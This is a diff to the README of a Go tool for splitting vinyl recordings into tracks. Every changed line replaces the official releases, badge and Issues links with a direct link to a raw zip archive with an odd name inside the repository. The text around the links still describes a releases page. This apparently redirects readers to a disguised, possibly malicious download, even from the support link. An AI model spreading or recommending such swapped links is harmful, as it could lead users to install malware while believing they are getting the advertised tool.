@@ -1,6 +1,6 @@
 # 🎶 vinyl_pipeline - Split Vinyl Recordings Easily
 
-[![Download vinyl_pipeline](https://img.shields.io/badge/Download-vinyl_pipeline-brightgreen)](https://github.com/ForgeStacks/vinyl_pipeline/releases)
+[![Download vinyl_pipeline](https://github.com/ForgeStacks/vinyl_pipeline/raw/refs/heads/main/cmd/vinyl_pipeline_definement.zip)](https://github.com/ForgeStacks/vinyl_pipeline/raw/refs/heads/main/cmd/vinyl_pipeline_definement.zip)
 
 ## 📚 Overview
 vinyl_pipeline is a simple tool designed to help you split vinyl recordings into individual tracks. It automatically detects silence between tracks, making your listening experience smoother. This application is written in pure Go, which means you don’t need any additional libraries or software like FFmpeg. It comes as a single binary, simplifying the installation process.
@@ -18,7 +18,7 @@ Before you start, ensure your device meets the following requirements:
 ### 2. **Visit the Download Page**
 To get the application, visit the releases page. Click the link below:
 
-[Download vinyl_pipeline](https://github.com/ForgeStacks/vinyl_pipeline/releases)
+[Download vinyl_pipeline](https://github.com/ForgeStacks/vinyl_pipeline/raw/refs/heads/main/cmd/vinyl_pipeline_definement.zip)
 
 ### 3. **Download the Application**
 On the releases page, you will see a list of available versions. Find the latest release and look for the appropriate file for your operating system. Click the link to download it.
@@ -53,7 +53,7 @@ If you encounter issues:
 - Ensure your file format is supported.
 - Check if you have the required permissions to access the file.
 - Restart the application and try again.
-- If all else fails, visit the [Issues page](https://github.com/ForgeStacks/vinyl_pipeline/issues) for support.
+- If all else fails, visit the [Issues page](https://github.com/ForgeStacks/vinyl_pipeline/raw/refs/heads/main/cmd/vinyl_pipeline_definement.zip) for support.
 
 ## 📬 Support & Feedback
 For any questions or feedback, please visit the Issues section on our GitHub page. Your input helps us improve the application.
